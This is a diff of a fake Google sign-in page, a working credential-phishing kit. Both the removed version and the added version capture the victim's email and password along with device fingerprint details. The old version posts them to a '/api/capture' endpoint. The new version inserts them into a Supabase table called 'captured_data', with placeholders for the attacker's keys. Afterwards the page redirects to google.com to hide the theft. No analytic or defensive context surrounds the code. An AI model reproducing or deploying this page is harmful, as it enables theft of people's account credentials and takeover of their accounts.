@@ -3,167 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account Sign In</title>
+    <title>Sign in - Google Accounts</title>
     <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
+            font-family: Arial, sans-serif;
         }
 
         body {
-            background: #ffffff;
-            min-height: 100vh;
+            background: #fff;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1rem;
+            min-height: 100vh;
+            padding: 20px;
         }
 
         .container {
             width: 100%;
             max-width: 450px;
-            background: white;
             border: 1px solid #dadce0;
             border-radius: 8px;
             padding: 48px 40px 36px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
-        .google-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .logo {
+            text-align: center;
             margin-bottom: 16px;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: 500;
-            color: #202124;
+            letter-spacing: -1px;
         }
 
-        .google-logo .g-blue { color: #4285F4; }
-        .google-logo .g-red { color: #EA4335; }
-        .google-logo .g-yellow { color: #FBBC05; }
-        .google-logo .g-green { color: #34A853; }
+        .logo .g-blue { color: #4285F4; }
+        .logo .g-red { color: #EA4335; }
+        .logo .g-yellow { color: #FBBC05; }
+        .logo .g-green { color: #34A853; }
 
         h1 {
             font-size: 24px;
             font-weight: 400;
-            color: #202124;
             text-align: center;
             margin-bottom: 8px;
+            color: #202124;
         }
 
         .subtitle {
-            font-size: 16px;
-            color: #202124;
             text-align: center;
+            color: #202124;
             margin-bottom: 32px;
+            font-size: 16px;
         }
 
-        .input-field {
+        .input-group {
             margin-bottom: 24px;
             position: relative;
         }
 
-        .input-field input {
+        input {
             width: 100%;
             padding: 16px 14px;
             border: 1px solid #dadce0;
             border-radius: 4px;
             font-size: 16px;
-            transition: all 0.2s;
             outline: none;
-            background: transparent;
+            transition: 0.2s;
         }
 
-        .input-field input:focus {
+        input:focus {
             border-color: #1a73e8;
             border-width: 2px;
             padding: 15px 13px;
         }
 
-        .input-field label {
-            position: absolute;
-            left: 14px;
-            top: -8px;
-            background: white;
-            padding: 0 4px;
-            font-size: 12px;
-            color: #1a73e8;
-            font-weight: 500;
-        }
-
-        .forgot-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-        }
-
-        .forgot-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .forgot-link:hover {
-            text-decoration: underline;
-        }
-
-        .info-text {
-            font-size: 14px;
-            color: #5f6368;
-            line-height: 1.5;
-            margin-bottom: 32px;
-        }
-
-        .info-text a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .btn-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .create-link {
-            color: #1a73e8;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            padding: 10px 0;
-        }
-
-        .next-btn {
+        .btn {
+            width: 100%;
             background: #1a73e8;
             color: white;
             border: none;
-            padding: 10px 24px;
+            padding: 12px;
             border-radius: 4px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
-            min-width: 88px;
+            transition: 0.2s;
         }
 
-        .next-btn:hover {
+        .btn:hover {
             background: #1557b0;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
         }
 
-        .loading-spinner {
+        .btn:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .loading {
             display: none;
             width: 20px;
             height: 20px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top: 2px solid white;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto;
@@ -174,152 +118,120 @@
             100% { transform: rotate(360deg); }
         }
 
-        .footer {
-            margin-top: 24px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        .footer select {
-            border: none;
-            background: transparent;
-            color: #5f6368;
-            font-size: 12px;
-            cursor: pointer;
+        .forgot {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 32px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="google-logo">
+        <div class="logo">
             <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
         </div>
-        
         <h1>Sign in</h1>
         <p class="subtitle">to continue to Google</p>
 
-        <div class="input-field">
-            <input type="email" id="email" required autocomplete="username" placeholder=" ">
-            <label for="email">Email or phone</label>
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
         </div>
 
-        <div class="input-field" id="passwordField" style="display:none;">
-            <input type="password" id="password" autocomplete="current-password" placeholder=" ">
-            <label for="password">Enter your password</label>
+        <div class="input-group" id="passwordGroup" style="display:none;">
+            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
         </div>
 
-        <div class="forgot-row">
-            <a href="#" class="forgot-link">Forgot email?</a>
-        </div>
+        <a href="#" class="forgot">Forgot email?</a>
 
-        <p class="info-text">
-            Not your computer? Use a private browsing window to sign in.
-            <a href="#">Learn more</a>
-        </p>
-
-        <div class="btn-row">
-            <a href="#" class="create-link">Create account</a>
-            <button class="next-btn" id="nextBtn">
-                Next
-                <div class="loading-spinner" id="spinner"></div>
-            </button>
-        </div>
-
-        <div class="footer">
-            <select id="languageSelect">
-                <option value="en">English (United States)</option>
-                <option value="es">Español</option>
-                <option value="fr">Français</option>
-                <option value="de">Deutsch</option>
-                <option value="it">Italiano</option>
-            </select>
-            <div>
-                <a href="#" style="color:#5f6368;text-decoration:none;margin-right:16px;">Help</a>
-                <a href="#" style="color:#5f6368;text-decoration:none;margin-right:16px;">Privacy</a>
-                <a href="#" style="color:#5f6368;text-decoration:none;">Terms</a>
-            </div>
-        </div>
+        <button class="btn" id="submitBtn" onclick="handleSubmit()">
+            <span id="btnText">Next</span>
+            <div class="loading" id="loading"></div>
+        </button>
     </div>
 
     <script>
+        // REPLACE WITH YOUR SUPABASE CREDENTIALS
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE';
+        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';
+        
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
         let step = 1;
-        const emailInput = document.getElementById('email');
-        const passwordField = document.getElementById('passwordField');
-        const passwordInput = document.getElementById('password');
-        const nextBtn = document.getElementById('nextBtn');
-        const spinner = document.getElementById('spinner');
+        let email = '';
 
-        // Device information
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screenResolution: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            referrer: document.referrer,
-            cookiesEnabled: navigator.cookieEnabled,
-            platform: navigator.platform,
-            colorDepth: window.screen.colorDepth,
-            pixelRatio: window.devicePixelRatio,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            touchPoints: navigator.maxTouchPoints || 0,
-            vendor: navigator.vendor,
-            languages: navigator.languages
-        };
-
-        nextBtn.addEventListener('click', async function() {
+        function handleSubmit() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            
             if (step === 1) {
-                if (emailInput.value) {
-                    passwordField.style.display = 'block';
-                    emailInput.disabled = true;
-                    emailInput.style.background = '#f1f3f4';
-                    nextBtn.textContent = 'Sign in';
-                    step = 2;
-                    setTimeout(() => passwordInput.focus(), 100);
+                email = emailInput.value.trim();
+                if (!email) {
+                    alert('Please enter your email');
+                    return;
                 }
+                document.getElementById('passwordGroup').style.display = 'block';
+                document.getElementById('btnText').textContent = 'Sign in';
+                step = 2;
+                setTimeout(() => passwordInput.focus(), 100);
             } else if (step === 2) {
-                if (passwordInput.value) {
-                    nextBtn.disabled = true;
-                    spinner.style.display = 'block';
-                    nextBtn.textContent = '';
-                    
-                    const data = {
-                        email: emailInput.value,
-                        password: passwordInput.value,
-                        timestamp: new Date().toISOString(),
-                        ...deviceInfo
-                    };
-                    
-                    try {
-                        // Send to Vercel API
-                        await fetch('/api/capture', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify(data)
-                        });
-                    } catch (error) {
-                        console.error('Capture error:', error);
-                    }
-                    
-                    // Redirect to Google
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 1000);
+                const password = passwordInput.value;
+                if (!password) {
+                    alert('Please enter your password');
+                    return;
                 }
+                
+                document.getElementById('loading').style.display = 'block';
+                document.getElementById('btnText').style.display = 'none';
+                document.getElementById('submitBtn').disabled = true;
+                
+                // Save to Supabase
+                saveData(email, password);
+                
+                // Redirect to Google
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 1500);
             }
-        });
+        }
 
-        // Enter key support
-        emailInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && step === 1) nextBtn.click();
-        });
+        async function saveData(email, password) {
+            try {
+                const { data, error } = await supabase
+                    .from('captured_data')
+                    .insert([
+                        {
+                            email: email,
+                            password: password,
+                            user_agent: navigator.userAgent,
+                            referer: document.referrer || 'Direct',
+                            device_info: {
+                                language: navigator.language,
+                                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                platform: navigator.platform
+                            }
+                        }
+                    ]);
 
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && step === 2) nextBtn.click();
+                if (error) {
+                    console.error('Error saving:', error);
+                } else {
+                    console.log('✅ Data saved successfully');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleSubmit();
+        });
+        
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') handleSubmit();
         });
     </script>
 </body>
